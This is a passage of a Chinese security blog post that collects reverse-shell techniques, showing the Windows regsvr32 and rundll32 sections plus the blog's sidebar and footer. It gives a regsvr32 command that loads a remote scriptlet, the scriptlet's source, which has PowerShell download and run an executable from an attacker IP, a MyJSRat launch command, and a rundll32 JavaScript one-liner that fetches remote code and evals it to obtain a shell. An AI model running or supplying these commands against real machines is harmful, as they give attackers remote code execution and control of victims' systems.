+<h3 id="regsvr32命令"><a href="#regsvr32命令" class="headerlink" title="regsvr32命令"></a>regsvr32命令</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /u /s /i:http:<span class="comment">//47.94.80.xxx/down.sct scrobj.dll</span></span><br></pre></td></tr></table></figure>
+
+<p>down.sct源码为</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?XML version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">registration</span></span></span><br><span class="line"><span class="tag">    <span class="attr">description</span>=<span class="string">"Test"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">progid</span>=<span class="string">"Test"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">version</span>=<span class="string">"1.00"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">classid</span>=<span class="string">"&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;"</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"JScript"</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[</span><br><span class="line">    </span><br><span class="line"><span class="actionscript">            <span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>).Run(<span class="string">"powershell (new-object System.Net.WebClient).DownloadFile('http://47.94.80.xxx/ps/test.exe','D:\\a.exe');start-process 'D:\\a.exe'"</span>,<span class="number">0</span>,<span class="literal">true</span>);</span></span><br><span class="line">    </span><br><span class="line">        ]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">registration</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">public</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">method</span> <span class="attr">name</span>=<span class="string">"Exec"</span>&gt;</span><span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">public</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"JScript"</span>&gt;</span></span><br><span class="line">&lt;![CDATA[</span><br><span class="line">    </span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">Exec</span><span class="params">()</span></span></span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> r = <span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>).Run(<span class="string">"cmd.exe"</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行后可反弹shell。</p>
+<p><img src="//choge.top/2020/02/23/反弹shell脚本收集/ft-4.png" alt="ft-4"></p>
+<h3 id="rundll32命令"><a href="#rundll32命令" class="headerlink" title="rundll32命令"></a>rundll32命令</h3><p>这里推荐MyJSRat<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FRidter%2FMyJSRat" target="_blank" rel="noopener">https://github.com/Ridter/MyJSRat</a><br> 下载后运行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python MyJSRat.py -i  <span class="number">144.34</span><span class="number">.184</span>.xxx -p  <span class="number">8080</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/02/23/反弹shell脚本收集/ft-5.png" alt="ft-5"></p>
+<p>访问 Client Command</p>
+<p>cmd运行</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;<span class="built_in">document</span>.write();h=<span class="keyword">new</span>%<span class="number">20</span>ActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);h.Open(<span class="string">"GET"</span>,<span class="string">"http://144.34.184.2xx:8080/connect"</span>,<span class="literal">false</span>);<span class="keyword">try</span>&#123;h.Send();b=h.ResponseText;<span class="built_in">eval</span>(b);&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">new</span>%<span class="number">20</span>ActiveXObject(<span class="string">"WScript.Shell"</span>).Run(<span class="string">"cmd /c taskkill /f /im rundll32.exe"</span>,<span class="number">0</span>,<span class="literal">true</span>);&#125;</span><br></pre></td></tr></table></figure>
+
+<p>即可获得shell。</p>
+<p><img src="//choge.top/2020/02/23/反弹shell脚本收集/ft-6.png" alt="ft-6"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>参考链接中有非常多的姿势可以挖掘和学习</p>
+<p><a href="https://www.freebuf.com/articles/system/178150.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/178150.html</a></p>
+<p><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87017</a></p>
+<p><a href="https://www.jianshu.com/p/1a9ff74fee48" target="_blank" rel="noopener">https://www.jianshu.com/p/1a9ff74fee48</a></p>
+<p><a href="https://www.jianshu.com/p/b12c79464521" target="_blank" rel="noopener">https://www.jianshu.com/p/b12c79464521</a></p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/渗透技巧-从github下载文件的多种方法/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8Egithub%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/</a></p>
+<p><a href="http://www.52bug.cn/hkjs/4585.html" target="_blank" rel="noopener">http://www.52bug.cn/hkjs/4585.html</a></p>
+<p><a href="https://www.secpulse.com/archives/44450.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/44450.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+      
+    </div>
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>C0cho
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://choge.top/2020/02/23/反弹shell脚本收集/" title="反弹shell脚本收集">https://choge.top/2020/02/23/反弹shell脚本收集/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/反弹shell/" rel="tag"># 反弹shell</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/02/23/Getshell总结/" rel="next" title="Getshell总结">
+                  <i class="fa fa-chevron-left"></i> Getshell总结
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/02/24/Webshell和管理工具收集/" rel="prev" title="Webshell和管理工具收集">
+                  Webshell和管理工具收集 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux反弹shell"><span class="nav-number">1.</span> <span class="nav-text">Linux反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bash反弹"><span class="nav-number">1.1.</span> <span class="nav-text">bash反弹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#telnet反弹"><span class="nav-number">1.2.</span> <span class="nav-text">telnet反弹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nc（netcat）反弹"><span class="nav-number">1.3.</span> <span class="nav-text">nc（netcat）反弹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#perl反弹"><span class="nav-number">1.4.</span> <span class="nav-text">perl反弹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python反弹"><span class="nav-number">1.5.</span> <span class="nav-text">python反弹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php反弹"><span class="nav-number">1.6.</span> <span class="nav-text">php反弹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ruby反弹"><span class="nav-number">1.7.</span> <span class="nav-text">Ruby反弹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Java反弹"><span class="nav-number">1.8.</span> <span class="nav-text">Java反弹</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows反弹shell"><span class="nav-number">2.</span> <span class="nav-text">Windows反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#powershell反弹cmd"><span class="nav-number">2.1.</span> <span class="nav-text">powershell反弹cmd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#powershell反弹powershell"><span class="nav-number">2.2.</span> <span class="nav-text">powershell反弹powershell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#base64编码处理"><span class="nav-number">2.2.1.</span> <span class="nav-text">base64编码处理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python反弹cmd"><span class="nav-number">2.3.</span> <span class="nav-text">python反弹cmd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dll反弹cmd"><span class="nav-number">2.4.</span> <span class="nav-text">dll反弹cmd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mshta命令"><span class="nav-number">2.5.</span> <span class="nav-text">mshta命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#regsvr32命令"><span class="nav-number">2.6.</span> <span class="nav-text">regsvr32命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rundll32命令"><span class="nav-number">2.7.</span> <span class="nav-text">rundll32命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/author.jpg"
+      alt="C0cho">
+  <p class="site-author-name" itemprop="name">C0cho</p>
+  <div class="site-description" itemprop="description">记录生活的点点滴滴</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/yourname" title="GitHub &rarr; https://github.com/yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:yourname@gmail.com" title="E-Mail &rarr; mailto:yourname@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0cho</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">262k</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
+<script src="/js/schemes/pisces.js?v=7.4.1"></script>
+
+<script src="/js/next-boot.js?v=7.4.1"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.1"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
